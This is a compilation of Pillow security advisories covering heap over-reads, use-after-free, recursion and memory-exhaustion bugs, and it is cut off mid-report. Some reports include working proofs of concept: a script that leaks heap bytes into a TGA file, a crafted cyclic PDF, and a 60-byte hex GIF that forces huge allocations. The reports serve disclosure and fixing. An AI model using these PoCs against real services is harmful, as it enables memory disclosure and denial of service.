### Summary  Pillow's TGA RLE encoder reads past its row buffer when saving a mode `"1"` image. Adjacent process heap bytes can be copied into the generated TGA file.  The bug is reachable through the public save API:  ```python im.save(out, format="TGA", compression="tga_rle") ```  Older affected Pillow versions use the equivalent public option `rle=True`.  For mode `"1"`, Pillow allocates a packed row buffer of `ceil(width / 8)` bytes, but `ImagingTgaRleEncode()` treats the row as one full byte per pixel.  The maximum valid TGA width is `65535`. At that width:  ```text allocated packed row buffer: 8192 bytes encoder byte-offset walk:     65535 bytes maximum OOB window per row:   57343 bytes ```  On non-ASAN Pillow `12.2.0`, the public-only maximum-width PoC below serialized `57297` bytes from distinct out-of-bounds source offsets into one returned TGA, covering `99.92%` of the maximum adjacent heap window. No heap grooming, ctypes, private API, or malformed input file was used. The disclosure is emitted across many TGA packet payload copies of at most `128` bytes each, not one large `memcpy()`.  ### Details  `src/PIL/TgaImagePlugin.py` allows mode `"1"` TGA output and selects the `tga_rle` encoder when RLE compression is requested.  `src/encode.c:_setimage()` allocates the row buffer using the packed-bit formula:  ```c state->bytes = (state->bits * state->xsize + 7) / 8; state->buffer = (UINT8 *)calloc(1, state->bytes); ```  For mode `"1"`, `state->bits == 1`.  `src/libImaging/TgaRleEncode.c` then computes:  ```c bytesPerPixel = (state->bits + 7) / 8; ```  This becomes `1`, and the encoder uses pixel indexes as byte offsets:  ```c static int comparePixels(const UINT8 *buf, int x, int bytesPerPixel) {     buf += x * bytesPerPixel;     return memcmp(buf, buf + bytesPerPixel, bytesPerPixel) == 0; } ```  The packet payload `memcpy()` later copies those out-of-bounds source bytes into the output. Raw packets copy up to `128` contiguous bytes, while RLE packets copy one representative byte:  ```c memcpy(     dst, state->buffer + (state->x * bytesPerPixel - state->count), flushCount ); ```  A width-2 mode `"1"` image allocates one row byte and already triggers an ASAN heap-buffer-overflow read. Wider images increase the adjacent heap window and the amount of heap data that can be serialized.  ### PoC  #### Minimal ASAN trigger  ```python import io from PIL import Image  out = io.BytesIO() Image.new("1", (2, 1)).save(out, format="TGA", compression="tga_rle") ```  Observed on local Pillow `12.3.0.dev0` ASAN target:  ```text ERROR: AddressSanitizer: heap-buffer-overflow READ of size 1 comparePixels /out/src/src/libImaging/TgaRleEncode.c:10 ImagingTgaRleEncode /out/src/src/libImaging/TgaRleEncode.c:81 0 bytes after a 1-byte allocation from _setimage ```  #### Maximum-width heap disclosure  This PoC uses one maximum-width row. It parses the generated TGA packets and extracts only payload bytes whose source offsets were outside the allocated packed row. Rows are  avoided because they mostly repeat the same adjacent heap window.  Run the following with a standard affected Pillow installation.  ```python import hashlib import io import PIL from PIL import Image  WIDTH = 65535 ATTEMPTS = 20 ROW_BYTES = (WIDTH + 7) // 8 MAX_OOB_WINDOW = WIDTH - ROW_BYTES  def extract_oob_payload(data):     i = 18     pixel = 0     oob = bytearray()      while pixel < WIDTH:         descriptor = data[i]         i += 1         count = (descriptor & 0x7F) + 1          if descriptor & 0x80:             value = data[i]             i += 1             if pixel + count - 1 >= ROW_BYTES:                 oob.append(value)         else:             values = data[i : i + count]             i += count             oob.extend(values[max(ROW_BYTES - pixel, 0) :])          pixel += count      return bytes(oob)   best = b""  for _ in range(ATTEMPTS):     out = io.BytesIO()     Image.new("1", (WIDTH, 1), 0).save(out, format="TGA", compression="tga_rle")     oob = extract_oob_payload(out.getvalue())     if len(oob) > len(best):         best = oob  with open("/tmp/max_oob_bytes.bin", "wb") as fp:     fp.write(best)  print(f"Pillow={PIL.__version__}") print(f"packed_row_bytes={ROW_BYTES}") print(f"maximum_oob_window={MAX_OOB_WINDOW}") print(f"serialized_distinct_oob_offsets={len(best)}") print(f"nonzero_oob_bytes={sum(byte != 0 for byte in best)}") print(f"coverage={len(best) / MAX_OOB_WINDOW:.2%}") print(f"sha256={hashlib.sha256(best).hexdigest()}") ```  Observed on installed Pillow `12.2.0`:  ```text Pillow=12.2.0 packed_row_bytes=8192 maximum_oob_window=57343 serialized_distinct_oob_offsets=57297 nonzero_oob_bytes=54407 coverage=99.92% ```  ### Impact  This is a heap out-of-bounds read and potential information disclosure.  A maximum-width single-row image can cause nearly the full `57343`-byte adjacent heap window to be incorporated into one output file.

## Summary  When Pillow loads an uncompressed image whose tile uses the `raw` codec and a mode in `Image._MAPMODES`, and the image was opened **from a filename**, it memory-maps the file and builds the image's row pointers directly into the mapping via `PyImaging_MapBuffer` (`src/map.c`). The per-row spacing (`stride`) is taken from the tile arguments. `map.c` validates `offset + ysize*stride <= buffer_len` but **never checks that `stride` is at least the natural row width `xsize * pixelsize`**.  The **McIdas** AREA plugin (`McIdasImagePlugin.py`) derives `stride`, `offset`, `xsize`, and `ysize` directly from attacker-controlled 32-bit header words with no validation. By supplying a `stride` far smaller than the row width, an attacker makes each row pointer read `xsize*pixelsize` bytes that run past the mapped region. Accessing the pixels (e.g. `Image.tobytes()`, `getpixel`, `convert`, `save`) then reads adjacent process memory (information disclosure) or faults (SIGBUS, denial of service).   ## Complete Code Trace  **Step 1: `McIdasImageFile._open`** - turns attacker header words into image size, file offset, and row stride with no validation.  ```python # src/PIL/McIdasImagePlugin.py:41-70 s = self.fp.read(256) if not _accept(s) or len(s) != 256:        # _accept: prefix == b"\x00\x00\x00\x00\x00\x00\x00\x04"     raise SyntaxError(...) self.area_descriptor = w = [0, *struct.unpack("!64i", s)]   # w[1..64] = signed BE int32, ALL attacker-controlled  if w[11] == 1:     mode = rawmode = "L"                    # pixelsize 1, in _MAPMODES elif w[11] == 2:     mode = rawmode = "I;16B"                # pixelsize 2, in _MAPMODES ... self._mode = mode self._size = w[10], w[9]                    # (xsize, ysize)  <-- attacker offset = w[34] + w[15]                       # <-- attacker stride = w[15] + w[10] * w[11] * w[14]       # <-- attacker (set w[14]=0, w[15]=1 => stride=1) self.tile = [     ImageFile._Tile("raw", (0, 0) + self.size, offset, (rawmode, stride, 1)) ] ```  **Step 2: `ImageFile.load` (mmap branch)** - selects mmap and delegates to `map_buffer`.  ```python # src/PIL/ImageFile.py:322-348 if use_mmap:                                 # use_mmap = self.filename and len(self.tile) == 1     decoder_name, extents, offset, args = self.tile[0]     if (decoder_name == "raw" and isinstance(args, tuple) and len(args) >= 3             and args[0] == self.mode and args[0] in Image._MAPMODES):         if offset < 0:                       # only lower-bound guard on offset             raise ValueError("Tile offset cannot be negative")         with open(self.filename) as fp:             self.map = mmap.mmap(fp.fileno(), 0, access=mmap.ACCESS_READ)         if offset + self.size[1] * args[1] > self.map.size():   # == offset + ysize*stride; NO stride>=linesize check             raise OSError("buffer is not large enough")         self.im = Image.core.map_buffer(             self.map, self.size, decoder_name, offset, args      # args = ("L", stride, 1)         ) ```  **Step 3: `PyImaging_MapBuffer`** - builds row pointers at `stride` spacing into the mmap; validates everything except `stride >= row width`.  ```c /* src/map.c:65-140 */ if (!PyArg_ParseTuple(args, "O(ii)sn(sii)",         &target, &xsize, &ysize, &codec, &offset, &mode_name, &stride, &ystep))     return NULL; ... const ModeID mode = findModeID(mode_name);          /* "L" */  if (stride <= 0) {                                  /* attacker sets stride=1 (>0) -> NOT recomputed */     if (mode == IMAGING_MODE_L || mode == IMAGING_MODE_P) stride = xsize;     else if (isModeI16(mode)) stride = xsize * 2;     else stride = xsize * 4; }  if (stride > 0 && ysize > PY_SSIZE_T_MAX / stride) {/* overflow guard only */     PyErr_SetString(PyExc_MemoryError, "Integer overflow in ysize"); return NULL; } size = (Py_ssize_t)ysize * stride;                  /* = 1*1 = 1 */  if (offset > PY_SSIZE_T_MAX - size) { ... } ... if (offset + size > view.len) {                     /* 1 + 1 = 2 <= 256 -> PASSES */     PyErr_SetString(PyExc_ValueError, "buffer is not large enough");     PyBuffer_Release(&view); return NULL; }  im = ImagingNewPrologueSubtype(mode, xsize, ysize, sizeof(ImagingBufferInstance)); /* im->linesize = xsize * pixelsize = 200000  (the REAL per-row read width) */  /* setup file pointers -- NO check that stride >= im->linesize */ if (ystep > 0) {     for (y = 0; y < ysize; y++) {         im->image[y] = (char *)view.buf + offset + y * stride;   /* row points into mmap, spacing=1 */     } } else { ... } ```  `im->linesize` (the number of bytes any consumer reads per row) is `xsize * pixelsize = 200000`, but the row pointers are only `stride = 1` byte apart and the buffer is only `offset + ysize*stride = 2` bytes "claimed". Nothing reconciles the two.  **Step 4: pixel access (`Image.tobytes()` → raw encoder `copy1`)** - reads `linesize` bytes from `im->image[0]`, i.e. `xsize` bytes starting at `view.buf + offset`, running far past the mmap.  ```c /* the raw "L" packer copies linesize (=xsize) bytes per row from im->image[y];    for row 0 that is view.buf+1 .. view.buf+1+200000, vs a 256-byte file. */ ```  ## Chain Summary  ``` SOURCE: McIdas AREA header words w[9],w[10],w[11],w[14],w[15],w[34]  (Image.open on a path)   ↓ McIdasImagePlugin._open: stride = w[15]+w[10]*w[11]*w[14]  -> attacker sets stride=1   [McIdasImagePlugin.py:66]   ↓ tile = ("raw", (0,0,xsize,1), offset, ("L", 1, 1))                                     [McIdasImagePlugin.py:68] GADGET: ImageFile.load mmap branch -- only checks offset+ysize*stride<=len  <- BUG: no stride>=linesize check  [ImageFile.py:343]   ↓ core.map_buffer(map, (xsize,1), "raw", offset, ("L",1,1))                              [ImageFile.py:346] SINK: PyImaging_MapBuffer: im->image[0] = view.buf + offset + 0*stride; linesize=xsize   [map.c:134]   ↓ Image.tobytes() raw "L" encoder reads linesize (=xsize) bytes from im->image[0] IMPACT: reads xsize bytes from a tiny mmap -> OOB read of adjacent process memory (leak) or SIGBUS (DoS) ``` ## Proof of Concept  See attached [poc.zip](https://github.com/user-attachments/files/28460498/poc.zip)   ## Impact on a Parent Application  Any application that opens image files supplied by users **from a path on disk** (the common pattern: save upload to a temp file, then `Image.open(path)`), has the default plugin set (McIdas is registered by default), and subsequently reads/returns/re-encodes the decoded pixels (thumbnailing, format conversion, serving a preview), is exposed:  - **Information disclosure (High):** the decoded "image" contains bytes of the   worker process's adjacent heap/mapped memory, which the app then serves or stores - potentially leaking secrets, credentials, or other users' data. - **Denial of service (High):** a larger `xsize` reliably crashes the worker with SIGBUS.  ## Suggested fix Core fix in `src/map.c` (`PyImaging_MapBuffer`): reject `offset < 0` and `stride < im->linesize`. Defense-in-depth in `McIdasImagePlugin._open`: reject `offset < 0` or `stride < xsize*pixelsize` .

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's P;2L and P;4L raw decoders can read past the end of an input buffer. ImagingRawDecode calculates a packed-pixel row size, while the unpackers read separately padded bit planes. A caller can supply a buffer and image dimensions whose accepted size is smaller than the unpacker's actual footprint. This can disclose up to three adjacent heap bytes in output pixels or crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.3.0 until 13.0.0, Pillow has a heap use-after-free when libtiff rejects a tag while encoding TIFF data to an in-memory buffer. When an application saves attacker-influenced TIFF tags to BytesIO, libtiff can reject a tag during encoding in ImagingLibTiffEncode; the error path then frees the output buffer without closing or clearing the TIFF handle, and later cleanup flushes through the write callback into freed memory, which can crash the process and may enable code execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's rank-based filters can dereference invalid image storage for a zero-size image. ImagingExpand() allocates a non-empty output and then faults while replicating edges by reading the first pixel from empty input storage; ImagingRankFilter is never reached. An attacker can supply or cause creation of a zero-size image to an application that applies a rank, median, minimum, or maximum filter. This causes a native process crash. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.0.0 until 13.0.0, multi-frame loaders can retain an ImagingCore allocation created for a narrow frame mode while a later frame of the same dimensions changes the logical mode and decoder tiles to wider RGB or CMYK data. ImageFile.load_prepare() reuses the stale native storage because _im is non-null without verifying that its mode and size still match. Crafted PSD, MPO, DCX, or MIC frame transitions can then write wider pixels into the narrow allocation, causing native out-of-bounds writes and crashes. The MPO path can also cause a native over-read and, in demonstrated runtime-specific profiles, command execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, PILfont text-width accumulation in src/_imaging.c checks positive glyph advances against INT_MAX but does not check negative advances against INT_MIN. Repeating a signed 16-bit advance of -32768 can therefore execute a signed C integer overflow in xsize += dx, producing a large positive width from a negative mathematical result. Applications that use getlength(), getsize(), or derived layout, quota, serialization, or allocation calculations can experience logic-integrity errors or resource consumption, while the high-level mask path commonly retains a decompression-bomb check. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0 on Windows, src/PIL/WmfImagePlugin.py passes unchecked 32-bit WMF or EMF dimensions to the native drawwmf handler in src/display.c. The handler sizes a DIB allocation from 16-bit-truncated bcWidth and bcHeight fields but copies pixel data using the original full dimensions. A crafted wide, short metafile can pass the pixel-count decompression-bomb check and make the Windows-only renderer read beyond the heap buffer, potentially disclosing memory or crashing the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's TIFF encoder can read beyond a ColorMap buffer when retained TIFF metadata has a plane size inconsistent with BitsPerSample. A small TIFF can be opened normally and then retain a crafted ColorMap that is reused when the image is saved. An application that re-encodes the attacker's TIFF with libtiff can trigger the out-of-bounds read. This can disclose heap memory in the output or crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, MpoImageFile.seek() and DcxImageFile.seek() reparse later MPO or DCX frames and replace self._size without rerunning Image._decompression_bomb_check(). A crafted multi-frame image can use a tiny first frame to pass Image.open() and then declare an over-limit later frame. Normal frame iteration through seek(), load(), or ImageSequence.Iterator can decode that frame and commit hundreds of megabytes or more, causing memory-exhaustion denial of service. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, the TarIO initializer in src/PIL/TarIO.py accepts a negative octal member size and computes a backward seek that returns to the same 512-byte header. When the requested member name does not match, the parser repeatedly reads that header, consumes a full CPU core, and never returns. TarIO is reached only when an application directly uses PIL.TarIO.TarIO rather than the default Image.open() path. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's FlashPix JPEG-tile decoder can write decoded scanlines beyond the allocated tile buffer. FlashPix (FPX) JPEG decoding selects raw mode LA with two bytes per pixel, while an unrecognized JPEG mode can be decoded as JCS_UNKNOWN with four components, causing ImagingJpegDecode to write four-component scanlines into the two-byte tile buffer. An attacker can supply a crafted OLE2 FlashPix file to an application with the optional olefile dependency installed that opens or thumbnails untrusted input. This can corrupt heap memory and may allow arbitrary code execution. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, SpiderImageFile.seek() in src/PIL/SpiderImagePlugin.py reparses a later SPIDER stack frame and replaces self._size without rerunning Image._decompression_bomb_check(). A tiny file can use a safe first frame to pass Image.open() and then declare very large dimensions in a later mode F frame. Loading that frame allocates approximately four bytes per attacker-declared pixel and can consume multiple gigabytes of memory. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's XBM header parser is vulnerable to regular-expression denial of service. In XbmImageFile._open, when an application calls Image.open() on a small crafted XBM file, XbmImagePlugin applies a backtracking expression to the attacker-controlled header before image dimensions are accepted, stalling a worker for minutes and denying service. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.2.1 until 13.0.0, Arrow export assumes that an image's rows are tightly contiguous and exports from im->blocks[0].ptr even when PILLOW_ALIGNMENT makes aligned_linesize include row padding or an aligned offset before the first row. The resulting Arrow buffer can include uninitialized padding, bytes preceding the first row, or stale heap contents from previously freed images. Applications that configure alignment and export images to Arrow can therefore disclose one user's pixels or other process memory to another user. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow can double free image memory when ImagingScaleAffine encounters a selective allocation failure. The affected fast path handles Transform.EXTENT or pure scale-and-translate Transform.AFFINE operations with the default NEAREST resampling. The output image allocation must succeed while the additional per-column lookup allocation fails, after which the error path deletes image storage that later cleanup releases again. An attacker who can drive such a large Image.transform() operation under memory pressure may trigger the failure. This can crash the process and may corrupt memory. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's JPEG decoder can write a full-width scanline into a buffer sized for a requested draft scale. ImagingJpegDecode does not verify libjpeg's actual output width and component count after scaling is requested, and an 8-bit lossless SOF3 JPEG decoded by a build linked to libjpeg-turbo 3.x can ignore the requested downscaling geometry. An attacker can supply such a JPEG to an application that uses draft() or thumbnail() to request downscaling. This can corrupt heap memory, crash the process, or potentially allow code execution. Older libjpeg-turbo 2.x and IJG builds reject the SOF3 input. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. Prior to 13.0.0, Pillow's ImageMorph.MorphOp.apply() can access memory before a row buffer for a zero-width image. PPM and PGM input can create an image with width zero, and the native morphology routine indexes outrow[width - 1] without rejecting that geometry. An attacker can supply such an image to an application that applies a morphology operation. This can crash the process. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 12.0.0 until 13.0.0, Pillow's Image.merge() can dereference a null image8 plane. Validation skips the first input band, allowing a 32-bit integer or floating-point image backed by image32 storage to be merged as a narrower multiband image. A crafted IPTC file can reach this path when an application opens and loads it, or a caller can invoke Image.merge() directly with such a first band. This causes a native process crash. This issue is fixed in version 13.0.0.

Pillow is a Python imaging library. From 11.0.0 until 13.0.0, Exif.load() in src/PIL/Image.py repeatedly slices the remaining EXIF data while it begins with the six-byte Exif header. src/PIL/PngImagePlugin.py accepts an uncapped PNG eXIf chunk, so a file filled with repeated headers causes a new shrinking copy on every iteration and quadratic CPU work. The condition is reachable through Image.getexif(), Image._getexif(), and ImageOps.exif_transpose(), including common photo-upload rotation workflows. This issue is fixed in version 13.0.0.

### Summary When an application appends to an existing PDF with `Image.save(..., format="PDF", append=True)`, Pillow parses that file with `PdfParser`. Two recursive parsers have no effective bound. `linearize_page_tree` follows `/Kids` with no visited set or depth limit, so a cyclic or duplicated page tree recurses without end. `read_prev_trailer` rejects only an exactly repeated `/Prev` offset, so a long chain of unique offsets still recurses. The trailer-loop guard added for CVE-2026-42310 does not cover either case.  ### Details `linearize_page_tree` recurses on `/Kids` with no cycle or depth check:  - `src/PIL/PdfParser.py:1078-1092`  `read_prev_trailer` catches only a repeated offset:  - `src/PIL/PdfParser.py:697-720` (the `processed_offsets` check at `:714-718` is the CVE-2026-42310 fix; a unique-offset chain slips past it)  ### PoC ```python from PIL import PdfParser  # A page tree whose /Pages nodes reference each other in a cycle (2 -> 3 -> 2). objs = {     1: b"<< /Type /Catalog /Pages 2 0 R >>",     2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",     3: b"<< /Type /Pages /Kids [2 0 R] /Count 1 >>", } buf = bytearray(b"%PDF-1.4
") off = {} for oid in (1, 2, 3):     off[oid] = len(buf)     buf += b"%d 0 obj
" % oid + objs[oid] + b"
endobj
" xref = len(buf) buf += b"xref
0 4
0000000000 65535 f 
" buf += b"".join(b"%010d 00000 n 
" % off[o] for o in (1, 2, 3)) buf += b"trailer
<< /Root 1 0 R /Size 4 >>
startxref
%d
%%%%EOF
" % xref open("poc.pdf", "wb").write(buf)  PdfParser.PdfParser("poc.pdf", mode="r+b")   # append=True parses the existing file the same way ```  Run it: ``` $ python 11_poc.py RecursionError: maximum recursion depth exceeded ```  The 315-byte file triggers the recursion on parse. A duplicated (non-cyclic) `/Kids` tree instead produces super-linear CPU and memory work, and a long unique-offset `/Prev` chain triggers the trailer-side recursion.  ### Impact A service that appends to user-supplied PDFs, for example a stamping or watermarking pipeline, can be driven into uncaught recursion or heavy CPU and memory use before any image is written. Follow-up to CVE-2026-42310. Since Pillow's policy discourages filing plain Python exceptions as denial of service, lead with the cyclic-tree case, which burns CPU and memory rather than only raising `RecursionError`. The fix is a visited set plus a depth limit in both parsers.

``` ============================================================================ GIF seek keeps rejected size after DecompressionBombError, allowing DoS Location: src/PIL/GifImagePlugin.py:293 in GifImageFile._seek() Commit: a707c6b21c313880d0771e54965d142dd42358b6 ============================================================================ ``` A GIF of about 60 bytes can make Pillow allocate gigabytes of memory. This affects applications that catch the "image too large" error raised while stepping to a later animation frame and then keep using the same image object. Pillow correctly refuses the oversized frame, but it stores the refused dimensions on the image object anyway, and later operations size their memory from them. An attacker who can upload a GIF to such a service can exhaust its memory: the process either fails with an out-of-memory error after committing gigabytes, or is killed by the operating system. There is no memory corruption. The bug is in `GifImageFile._seek()` (`src/PIL/GifImagePlugin.py:292-294`). When a frame's extent enlarges the image, the code assigns the new size to `self._size` and only then calls `Image._decompression_bomb_check()`. Nothing restores the old size when `DecompressionBombError` is raised, because `seek()` only rolls back on `EOFError`. After the caught error, `im.size` reports the rejected size while the pixel buffer `im.im` is still the 1×1 first frame. Because the extent is a 16-bit offset plus a 16-bit size, that rejected size can be as large as 131070×131070. In the attached reproducer, the rejected size is 40000×40000. A retried `seek(1)` followed by `load()` then reaches `load_prepare()`, which calls `Image.core.fill()` with that size to decode a single pixel. Peak memory rises from 17 MiB to 1700 MiB before a 3 GiB address-space cap stops the next allocation. `Image.new("RGB", im.size, ...)` and `rotate(..., expand=True)` also allocate from the stale size. The default paths are unaffected: plain `Image.open()` plus `load()`, `ImageSequence.Iterator`, and `n_frames`/`is_animated`. The ordering was introduced in c9f1b35e9810 ("Added GIF decompression bomb check", 2022-06-30, first released in 9.2.0), the check added for CVE-2022-45198. The two dispose-extent checks later in the same function already validate before using the size, and the attached patch makes this check follow the same order. ## Details `GifImageFile._seek()` lets a later frame enlarge the image, and performs the decompression-bomb check for the new size only *after* storing it on the object: ```python # src/PIL/GifImagePlugin.py:289-294 (GifImageFile._seek) x0, y0 = i16(s, 0), i16(s, 2) x1, y1 = x0 + i16(s, 4), y0 + i16(s, 6) if (x1 > self.size[0] or y1 > self.size[1]) and update_image: self._size = max(x1, self.size[0]), max(y1, self.size[1]) # state mutated Image._decompression_bomb_check(self._size) # ...then validated ``` `_decompression_bomb_check()` (`src/PIL/Image.py:3586`) raises `DecompressionBombError` for anything above `2 * MAX_IMAGE_PIXELS` (178 956 970 px by default), but by then `self._size` already holds the rejected value and nothing restores it: `seek()` (`GifImagePlugin.py:166-179`) only rolls back on `EOFError`, and `_seek(0)` only ever grows `_size`. The object that the application still holds therefore reports `im.size == (40000, 40000)` while `im.im` is the 1×1 buffer of frame 0. Compare the two dispose-extent checks a few lines further down in the same function (`GifImagePlugin.py:383` and `:407`), which call `_decompression_bomb_check(dispose_size)` *before* the corresponding `Image.core.fill()`, and `TiffImagePlugin.load_prepare()` (`src/PIL/TiffImagePlugin.py:1319-1321`), which checks `_tile_size` before allocating from it. With this 60-byte GIF (hex) ``` 47494638396101000100800000000000ffffff GIF89a, 1x1 screen, 2-entry global palette 2c000000000100010000 02 024401 00 frame 0: 1x1 @ (0,0), LZW data 2c00000000409c409c00 frame 1 descriptor: 40000x40000 @ (0,0) 2c000000000100010000 02 024401 00 another 1x1 frame 3b trailer ``` `Image.open()` succeeds (`im.size == (1, 1)`), `im.seek(1)` raises `DecompressionBombError: Image size (1600000000 pixels) exceeds limit of 178956970 pixels`, and afterwards `im.size == (40000, 40000)`, `im.im.size == (1, 1)`, `im.tell() == 0`. What happens next depends on what the application does with the object, but several ordinary operations take their dimensions from `im.size` rather than from the C buffer: - Retrying `im.seek(1)`. The failed `_seek` left `self.__offset == 0` and the file pointer just past the 9-byte descriptor, so the retry parses whatever follows — in the file above, a valid 1×1 frame — and succeeds. `im.load()` then runs `GifImageFile.load_prepare()`: ```python # src/PIL/GifImagePlugin.py:452-456 elif self.mode in ("RGB", "RGBA"): self._prev_im = self.im if self._frame_palette: self.im = Image.core.fill("P", self.size, self._frame_transparency or 0) ``` which allocates and `memset`s a 40000×40000 "P" image (1.6 GB) to decode a 1×1 tile into, and `load_end()` (`GifImagePlugin.py:485-491`) fills a second one and converts it to RGB (another 1.6 GB + 6.4 GB). - `im.rotate(angle, expand=True)` for a non-multiple-of-90 angle, or the common flatten-onto-background idiom `Image.new("RGB", im.size, bg)`, allocate from `im.size` as well (measured on an object poisoned to 20000×20000: `rotate(45, expand=True)` completes and touches 776 MiB; `Image.new("RGB", im.size, "white")` touches 1.5 GiB). Operations that pass `im.size` as a box against the real buffer (`thumbnail`, `resize`, `save`) fail with `ValueError`/`SystemError` instead. The extent fields are 16-bit offset plus 16-bit size, so the stored size can be pushed to 131070×131070 (17.2 Gpx; 17 GB for mode "P", 69 GB for "RGB"/"RGBA" storage), 96× the error threshold. `n_frames` / `is_animated` are not affected: they call `_seek(frame, update_image=False)`, which skips the `_size` assignment (the file above reports `n_frames == 2`, `is_animated == True` and leaves `im.size` at 1×1). ## Impact A remote user who can upload a GIF to a service that (a) seeks animation frames and (b) catches the exception from `seek()` — a broad `except Exception` around a `while True: im.seek(im.tell()+1)` frame-collection loop, or an explicit `except DecompressionBombError: log and continue` — and then keeps using the same `Image` object, ends up driving allocations of 1.6 GB to tens of GB from a 60-byte file: `MemoryError` after the process has committed gigabytes, or an OOM kill of the worker when no address-space limit is set. The `MAX_IMAGE_PIXELS` guard fires, but does not actually keep the rejected dimensions out of the object it is guarding. The precondition is real application behaviour but not the default path: `Image.open(); im.load()` is unaffected, and `ImageSequence.Iterator` propagates the error out of the `for` statement (a `try` inside the loop body does not swallow it). Hence low severity. This is adjacent to the GIF extent bomb check added for CVE-2022-45198: the ordering was introduced with that check in `c9f1b35e9810` ("Added GIF decompression bomb check", 2022-06-30), first released in Pillow 9.2.0. Before it, the same size growth happened with no check at all; the check introduced there is the one that runs too late. ## Reproducing `repro` is a single Python script run against the installed Pillow. It needs about 1.7 GB of free RAM. 1. **`setup_env()`** caps the process address space at 3 GiB with `RLIMIT_AS`, so the oversized allocations end in `MemoryError` instead of the OOM killer. It then opens the 60-byte GIF shown above, built in memory by `bomb_gif()`. The GIF contains a 1×1 screen and a 1×1 frame 0, so `Image.open()` passes its own bomb check. Next comes a bare frame-1 image descriptor that declares 40000×40000 (1.6 Gpx, about 9× the error threshold). A real 1×1 frame follows it. 2. **`poc()`** calls `im.seek(1)` and catches `DecompressionBombError`, the way an application that skips bad frames would. 3. **First check: the state is inconsistent.** The script prints `im.size` next to the real pixel buffer `im.im.size`. If the rejected frame had left the object unchanged, both would be `(1, 1)`. On the affected code `im.size` is `(40000, 40000)`. 4. **Second check: memory use.** The script retries `im.seek(1)`, which now parses the trailing 1×1 frame, and calls `im.load()`. It prints the process's peak RSS before and after. `load_prepare()` sizes its `Image.core.fill()` from `im.size`, so loading a single pixel fills a 1.6 GB buffer before the 3 GiB cap stops the next allocation. ### Summary  Pillow's libImaging `_decodeTile` decoder, used to decode tiled TIFF images, allocates a per-tile buffer using `realloc(state->buffer, TIFFTileSize(tiff))`. After each `TIFFReadTile` it then iterates `tile_y` from 0 up to `current_tile_length` and calls the configured row unpacker (here `copy4`) with the source pointer `state->buffer + tile_y * row_byte_size`. When libtiff returns a `tile_bytes_size` smaller than the worst-case `row_byte_size * tile_length`, the inner stride-and-copy loop walks past the realloc'd region and `copy4` performs a 1024-byte `memcpy` that reads up to `(tile_length-1) * row_byte_size + row_byte_size` bytes from a buffer sized only to `tile_bytes_size`. The supplied PoC TIFF triggers a 1024-byte over-read exactly 0 bytes past a 196608-byte allocation. An attacker who can convince a Pillow-using application to decode a crafted TIFF can trigger a process crash (DoS) and may cause adjacent heap memory to be copied into the decoded pixel buffer.  ### Details  Pillow's TIFF decoder, when libtiff reports the file is tiled, takes the `_decodeTile` path. The function:  1. Asks libtiff for `TIFFTileSize(tiff)` (the bytes-per-tile) and `TIFFTileRowSize(tiff)` (the bytes per row *as stored by libtiff*). 2. Reallocates `state->buffer` to exactly `tile_bytes_size`. 3. For each tile origin `(x, y)` and each plane, calls `TIFFReadTile` into `state->buffer`, then walks the tile row by row, calling the configured `ImagingShuffler` (here `copy4`) on each row's worth of source bytes.  The validation done before the loop is:  ```c if (tile_bytes_size > ((tile_length * state->bits / planes + 7) / 8) * tile_width) {     state->errcode = IMAGING_CODEC_BROKEN;     return -1; } ```  This rejects oversized libtiff tiles, but it does **not** reject *undersized* ones — i.e. the case where libtiff returns a `tile_bytes_size` strictly **less** than `row_byte_size * tile_length`. The loop body, however, indexes into the buffer assuming the buffer is at least `row_byte_size * tile_length` bytes long.  ### Vulnerable Code  ```c // src/libImaging/TiffDecode.c:446-490 — _decodeTile new_data = realloc(state->buffer, state->bytes);   // bytes = tile_bytes_size if (!new_data) { ... } state->buffer = new_data;  for (y = state->yoff; y < state->ysize; y += tile_length) {     for (plane = 0; plane < planes; plane++) {         ImagingShuffler shuffler = unpackers[plane];         for (x = state->xoff; x < state->xsize; x += tile_width) {             if (TIFFReadTile(tiff, (tdata_t)state->buffer, x, y, 0, plane) == -1) { ... }              current_tile_width  = min((INT32)tile_width,  state->xsize - x);             current_tile_length = min((INT32)tile_length, state->ysize - y);             for (tile_y = 0; tile_y < current_tile_length; tile_y++) {                 shuffler(                     (UINT8 *)im->image[tile_y + y] + x * im->pixelsize,                     state->buffer + tile_y * row_byte_size,   // <-- OOB stride                     current_tile_width                 );             }         }     } } ```  ```c // src/libImaging/Unpack.c:1288-1291 — copy4 (the crash site) static void copy4(UINT8 *out, const UINT8 *in, int pixels) {     /* RGBA, CMYK quadruples */     memcpy(out, in, 4 * pixels);   // <-- ASAN-detected READ here } ```  The PoC's tile metadata yields `tile_width = tile_length = 256`, `row_byte_size = 1024` (4 bytes/pixel × 256 pixels), and `tile_bytes_size = 196608` (which is 256·256·3 = three-channel-byte storage). The realloc'd buffer is 196608 bytes. The unpacker iterates `tile_y` from 0 to 255 and for the highest rows the source pointer `state->buffer + tile_y * 1024` already lies at or past offset 196608 — the very last row's `memcpy(in=buffer+255·1024, 1024)` reads 1024 bytes starting `260096 - 196608 = 63488` bytes past the allocation; ASAN flags the very first byte past the heap region (`READ of size 1024 at … 0 bytes after 196608-byte region`).  The mismatch is real: libtiff's `TIFFTileSize` returns the *packed* per-tile storage (which depends on the 